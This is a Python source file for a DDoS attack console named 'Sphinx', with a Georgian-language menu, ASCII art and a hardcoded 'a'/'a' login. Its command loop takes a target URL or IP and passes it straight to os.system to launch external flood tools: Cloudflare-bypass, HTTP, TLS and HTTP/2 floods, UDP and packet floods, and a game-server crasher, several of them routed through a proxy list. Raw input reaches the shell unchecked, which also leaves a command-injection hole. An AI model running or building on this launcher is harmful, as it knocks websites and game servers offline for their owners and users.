
import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxies.txt').readlines()
bots = len(proxys)

def ascii_vro():
    clear()
    print(f'''
                  (\__.-. |
                  == ===_]+
                          |
 ` - .
       ` - >->


      ....           ....           ....           ....
     ||             ||             ||             ||
 /"""l|\        /"""l|\        /"""l|\        /"""l|\\
/_______\      /_______\      /_______\      /_______\\
|  .-.  |------|  .-.  |------|  .-.  |------|  .-.  |------
 __|L|__| .--. |__|L|__| .--. |__|L|__| .--. |__|L|__| .--.
_\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'_
------------------------------------------------------------
    ''')
    time.sleep(0.6)
    clear()
    print(f'''
                     (\__.-. |
                     == ===_]+
                             |
 ` - .
       ` - .
            >->


      ....           ....           ....           ....
     ||             ||             ||             ||
 /"""l|\        /"""l|\        /"""l|\        /"""l|\\
/_______\      /_______\      /_______\      /_______\\
|  .-.  |------|  .-.  |------|  .-.  |------|  .-.  |------
 __|L|__| .--. |__|L|__| .--. |__|L|__| .--. |__|L|__| .--.
_\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'_
------------------------------------------------------------
    ''')
    time.sleep(0.6)
    clear()
    print(f'''
                         (\__.-. |
                         == ===_]+
                                 |
 ` - .
       ` - .
            - 
              ` >->

      ....           ....           ....           ....
     ||             ||             ||             ||
 /"""l|\        /"""l|\        /"""l|\        /"""l|\\
/_______\      /_______\      /_______\      /_______\\
|  .-.  |------|  .-.  |------|  .-.  |------|  .-.  |------
 __|L|__| .--. |__|L|__| .--. |__|L|__| .--. |__|L|__| .--.
_\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'_
------------------------------------------------------------
    ''')
    time.sleep(0.6)
    clear()
    print(f'''
                              (\__.-. |
                              == ===_]+
                                      |
 ` - .
       ` - .
            - 
              `
                - >->
      ....           ....           ....           ....
     ||             ||             ||             ||
 /"""l|\        /"""l|\        /"""l|\        /"""l|\\
/_______\      /_______\      /_______\      /_______\\
|  .-.  |------|  .-.  |------|  .-.  |------|  .-.  |------
 __|L|__| .--. |__|L|__| .--. |__|L|__| .--. |__|L|__| .--.
_\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'_
------------------------------------------------------------
    ''')
    time.sleep(0.6)
    clear()
    print(f'''
                              (\__.-. |
                              == ===_]+
                                      |
 ` - .
       ` - .
            - 
              `
                - 
      ....       `   ....           ....           ....
     ||          >-> ||             ||             ||
 /"""l|\        /"""l|\        /"""l|\        /"""l|\\
/_______\      /_______\      /_______\      /_______\\
|  .-.  |------|  .-.  |------|  .-.  |------|  .-.  |------
 __|L|__| .--. |__|L|__| .--. |__|L|__| .--. |__|L|__| .--.
_\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'_
------------------------------------------------------------
    ''')
    time.sleep(0.6)
    clear()
    print(f"""

     _.-^^---....,,--       
 _--                  --_  
<                        >)
|                         | 
 \._                   _./  
    ```--. . , ; .--'''       
          | |   |             
       .-=||  | |=-.   
       `-=#$%&%$#=-'   
          | ;  :|     
 _____.,-#%&$@%#&#~,._____
    """)
    time.sleep(0.8)
    clear()

def si():
    print('\x1b[38;2;0;255;255m[ \033[32mSphinx & MN3UM0N1C \x1b[38;2;0;255;255m] | \033[32mმოგესალმებით Sphinx & MN3UM0N1C ის  DDos სამყაროში! \x1b[38;2;0;255;255m| \033[32mGithub: SPHINX110 \x1b[38;2;0;255;255m| \033[32mახალი მეთოდები \x1b[38;2;0;255;255m+ \033[32mახალი სამყარო!')
    print("")

def tools():
    clear()
    si()
    print(f'''
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mTools     \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔═══════════════╩══════╦════════╩═══════════════╗
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mgeoip               \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mreverse-dns           \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mreverseip           \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║  
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255msubnet-lookup       \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255masn-lookup          \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mdns-lookup          \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚══════════════════════╩════════════════════════╝
''')



def ports():
    clear()
    si()
    print(f'''
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mPorts     \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔═══════════════╩═══════════════╩═══════════════╗
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m21 - \x1b[38;2;0;255;255mSFTP       \x1b[38;2;0;212;14m69   - \x1b[38;2;0;255;255mTFTP      \x1b[38;2;0;212;14m5060  - \x1b[38;2;0;255;255mRIP  \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m22 - \x1b[38;2;0;255;255mSSH        \x1b[38;2;0;212;14m80   - \x1b[38;2;0;255;255mHTTP      \x1b[38;2;0;212;14m30120 - \x1b[38;2;0;255;255mFIVEM\x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m23 - \x1b[38;2;0;255;255mTELNET     \x1b[38;2;0;212;14m443  - \x1b[38;2;0;255;255mHTTPS                  \x1b[38;2;0;212;14m║   
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m25 - \x1b[38;2;0;255;255mSMTP       \x1b[38;2;0;212;14m3074 - \x1b[38;2;0;255;255mXBOX                   \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m53 - \x1b[38;2;0;255;255mDNS        \x1b[38;2;0;212;14m5060 - \x1b[38;2;0;255;255mPLAYSATION             \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚═══════════════════════════════════════════════╝
''')

def layer7():
    clear()
    si()
    print(f'''
                              \x1b[38;2;0;212;14m╔═══════════════╗
                              \x1b[38;2;0;212;14m║    \x1b[38;2;0;255;255mLayer 7    \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╔══════════════╩════════╦══════╩══════════════╗
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255msocketv4            \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mnormal-bypass     \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-fuzz           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mCFBypass          \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp2               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mkflood            \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mtls                 \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mforce             \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-rand           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m                  \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-raw            \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m                  \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttpsockets         \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m                  \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╚═══════════════════════╩═════════════════════╝
''')

def layer4():
    clear()
    si()
    print(f'''
                              \x1b[38;2;0;212;14m╔═══════════════╗
                              \x1b[38;2;0;212;14m║    \x1b[38;2;0;255;255mLayer 4    \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╔══════════════╩════════╦══════╩══════════════╗
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mudp-god             \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>           \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhome-god            \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>           \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>           \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>           \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╚═══════════════════════╩═════════════════════╝
''')

def amp_games():
    clear()
    si()
    print(f'''
                              \x1b[38;2;0;212;14m╔═══════════════╗
                              \x1b[38;2;0;212;14m║\x1b[38;2;0;255;255m AMP's \x1b[38;2;0;212;14m/ \x1b[38;2;0;255;255mGames \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╔══════════════╩════════╦══════╩══════════════╗
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m                    \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m                  \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m                    \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m                  \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m                    \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mgame-crash        \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╚═══════════════════════╩═════════════════════╝
''')


def menu():
    sys.stdout.write(f"\x1b]2;Sphinx --> | Online Users: [1] | Methods: [9] | Bypass: [3] | Amps: [1]\x07")
    clear()
    print('\x1b[38;2;0;255;255m[   \033[32mSphinx & MN3UM0N1C \x1b[38;2;0;255;255m] |  \033[32mმოგესალმებით Sphinx & MN3UM0N1C ის DDos სამყაროში! \x1b[38;2;0;255;255m|  \033[32mGithub: SPHINX110 \x1b[38;2;0;255;255m|  \033[32mახალი მეთოდები \x1b[38;2;0;255;255m+  \033[32mახალი სამყარო!')      
    print("")
    print("""
 \033[32m
                  ██████╗ ██████╗  ██╗  ██╗ ██╗ ███╗  ██╗ ██╗  ██╗      
                 ██╔════╝ ██╔══██╗ ██║  ██║ ██║ ████╗ ██║ ╚██╗██╔╝     
                 ╚█████╗  ██████╔╝ ███████║ ██║ ██╔██╗██║  ╚███╔╝ 
                  ╚═══██╗ ██╔═══╝  ██╔══██║ ██║ ██║╚████║  ██╔██╗ 
                 ██████╔╝ ██║      ██║  ██║ ██║ ██║ ╚███║ ██╔╝╚██╗      
                 ╚═════╝  ╚═╝      ╚═╝  ╚═╝ ╚═╝ ╚═╝  ╚══╝ ╚═╝  ╚═╝
                \x1b[38;2;0;212;14m╔═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╗
                \x1b[38;2;0;212;14m║ \x1b[38;2;239;239;239mმოგესალმებით სფიქნსის  DDos სამყაროში!       \x1b[38;2;0;49;147m║
                \x1b[38;2;0;212;14m║        \x1b[38;2;0;49;147m   \x1b[38;2;239;239;239mსაუკეთსო DDos მეთოდი  \x1b[38;2;0;212;14m \x1b[38;2;0;49;147m
                \x1b[38;2;0;212;14m╚═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╝
                    \x1b[38;2;0;212;14m╔═══════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════╗
                    \x1b[38;2;0;212;14m║  \x1b[38;2;239;239;239mhttps://github.com/SPHINX110/storm  \x1b[38;2;0;49;147m
                    \x1b[38;2;0;212;14m╚═══════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════╝
                \x1b[38;2;0;212;14m╔═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╗
                \x1b[38;2;0;212;14m║   \x1b[38;2;239;239;239mაკრიფეთ [help]  ბრძანებების სანახავად.   \x1b[38;2;0;49;147m
                \x1b[38;2;0;212;14m╚═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╝
""")

def main():
    menu()
    while(True):
        cnc = input('''\x1b[38;2;0;212;14m╔══[DDos\x1b[38;2;0;186;45m@S\x1b[38;2;0;150;88mp\x1b[38;2;0;113;133mhi\x1b[38;2;0;83;168mnx\x1b[38;2;0;49;147m]
\x1b[38;2;0;212;14m╚\x1b[38;2;0;186;45m═\x1b[38;2;0;150;88m═\x1b[38;2;0;113;133m═\x1b[38;2;0;83;168m═\x1b[38;2;0;49;147m➤ \x1b[38;2;239;239;239m''')
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            layer7()
        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
            layer4()
        elif cnc == "amp/games" or cnc == "AMP/GAMES" or cnc == "amp/game" or cnc == "amps/game" or cnc == "amps/games" or cnc == "amp/games" or cnc == "AMP/GAME":
            amp_games()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
        elif cnc == "ports" or cnc == "port" or cnc == "PORTS" or cnc == "PORT":
            ports()
        elif cnc == "tools" or cnc == "tool" or cnc == "TOOLS" or cnc == "TOOL":
            tools()
        
        elif "normal-bypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node httpbypassv2.js {url} {time}')
            except IndexError:
                print('Usage: normal-bypass <url> <time>')
                print('Example: normal-bypass http://example.com 20')

        elif "cf-bypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                threads = cnc.split()[3]
                os.system(f'node cf.js {url} {time} {threads}')
            except IndexError:
                print('Usage: cf-bypass <url> <time> <threads>')
                print('Example: cf-bypass http://example-cloud.com 20 15')
                
                
        elif "kflood" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                threads = cnc.split()[3]
                rps = cnc.split()[4]
                key = cnc.split()[5]
                os.system(f'sudo ./kFLOOD {url} {time} {threads} {rps} {key} proxies.txt')
            except IndexError:
                print('Usage: kflood <url> <time> <threads> <rps> <key> <proxies>')
                print('Example: kflood http://example-cloud.com 360 20 40 1')        
                
                

        elif "http-raw" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                method = cnc.split()[3]
                os.system(f'node HTTP-RAW.js {url} {time} {method}')
            except IndexError:
                print('Usage: https-raw <url> <time> <GET/POST/HEAD>')
                print('Example: http-raw http://example.com 20 POST')

        elif "http-dstat" in cnc:
            try:
                url = cnc.split()[1]
                connections = cnc.split()[2]
                rps = cnc.split()[3]
                os.system(f'perl dstat.pl {url} {connections} {rps} 13.87')
            except IndexError:
                print('Usage: http-dstat <url> <connections> <rps>')
                print('Example: http-dstat http://example.org 50000 50000')


        elif "geoip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/geoip/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: geoip <ip>')
                print('Example: geoip 1.1.1.1')

        elif "reverseip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reverseiplookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverseip <ip>')
                print('Example: reverseip 1.1.1.1')

        elif "subnet-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/subnetcalc/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: subnet-lookup <cdr/ip + netmask>')
                print('Example: subnet-lookup 192.168.1.0/24')

        elif "asn-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/aslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: asn-lookup <ip/asn>')
                print('Example: asn-lookup AS15169')

        elif "dns-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/dnslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: dns-lookup <dns>')
                print('Example: dns-lookup google.com')

        elif "reverse-dns" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reversedns/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverse-dns <ip/domain>')
                print('Example: reverse-dns 8.8.8.8')                

        elif "http-fuzz" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node httpfuzz.js {url} proxies.txt {time} POST')
            except IndexError:
                print(f'Usage: http-fuzz <url> <time>')
                print("Example: http-fuzz http://sexo.org 30")


        elif "http-rand" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAND.js {url} {time}')
            except IndexError:
                print("Usage: http-rand <url> <time>")
                print("Example: http-rand http://si.com 10")

        elif "CFBypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f"node CFBypass.js {url} {time}")
            except IndexError:
                print("Usage: CFBypass <url> <time>")
                print("Example: CFBypass https://si.com 500")
                
                
        elif "force" in cnc:
            try:
                url = cnc.split()[1]
                proccess = cnc.split()[2]
                time = cnc.split()[3]
                rate = cnc.split()[4]
                os.system(f"node force.js get 10 {url} 360 64")    
                os.system(f"node force.js get 10 {url} 360 64")
            except IndexError:
                print("Usage: force <method> <proccess> <url> <time> <rate>")
                print("Example: force get 10 https://example.com 360 64")         
                
                
                
        elif "http2" in cnc:
            try:
                url = cnc.split()[1]
                threads = cnc.split()[2]
                os.system(f"node http2.js get {url} proxies.txt 500 500 {threads}")    
                os.system(f"node http2.js get {url} proxies.txt 500 500 200")
            except IndexError:
                print("Usage: http2 <url> <threads>")
                print("Example: http2 https://si.com 200")            
                  
              
                
        elif "tls" in cnc:
            try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
                 os.system(f"node tls.js {url} {time}")
            except IndexError:    
                print(f'Usage: tls <host> <time>')
                print(f'Example: tls http://example.org 500')                  

  
        elif "udp-god" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                threads = cnc.split()[3]
                throttle = cnc.split()[4]
                time = cnc.split()[5]
                os.system(f'sudo ./udp {ip} {port} {threads} {throttle} {time}')
            except IndexError:
                print(f'Usage: udp-god <ip> <port> <threads> <throttle> <time>')
                print(f'Example: udp-god 1.1.1.1 80 30 40000 30')


        elif "home-god" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                psize = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'perl home.pl {ip} {port} {psize} {time}')
            except IndexError:
                print(f'Usage: home-god <ip> <port> <packet_size> <time>')
                print(f'Example: home-god 1.1.1.1 80 1024 50')


        elif "socketv4" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                reqs = cnc.split()[3]
                os.system(f"node socketv4.js {url} proxies.txt {time} {reqs}")
            except IndexError:    
                print(f'Usage: socketv4 <host> <proxy> <time> <reqs>')
                print(f'Example: socketv4 http://example.org 500 500')
            
        elif "httpsockets" in cnc:
            try:
                url = cnc.split()[1]
                reqs = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f"node HTTP-SOCKETS.js {url} {reqs} {time}")          
            except IndexError:    
                print(f'Usage: httpsockets <host> <reqs> <time>')
                print(f'Example: httpsockets http://example.org 500 500')
            

        elif "game-crash" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'sudo ./GAME-CRASH {ip} {port}')
            except IndexError:
                print('Usage: game-crash <ip> <port>')
                print('Example: game-crash 192.168.0.1 22')

        elif "cloudflare-lag" in cnc:
            print('Method "CLOUDFLARE-LAG" not enabled')

        elif "help" in cnc:
            print(f''' \033[32m
layer7   > Layer 7 შეტევის მეთოდი
layer4   > Layer 4 შეტევის მეთოდი
amp/game > AMP / Games შეტევის მეთოდი
ports    > პორტის ნახვა
tools    > ხელსაწყოების ნახვა
cls      > ტერმინალის გასუფთავება
            ''')

        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass


def login():
    clear()
    user = "a"
    passwd = "a"
    username = input("</> მომხმარებელი: ")
    password = getpass.getpass(prompt='</> პაროლი: ')
    if username != user or password != passwd:
        print("")
        print("</> Invalid credentials! Abandoning...")
        sys.exit(1)
    elif username == user and password == passwd:
        print("</> მოგესალმებით Sphinx & MN3UM0N1C ის DDos სამყაროში!")
        time.sleep(0.3)
        ascii_vro()
        main()

login()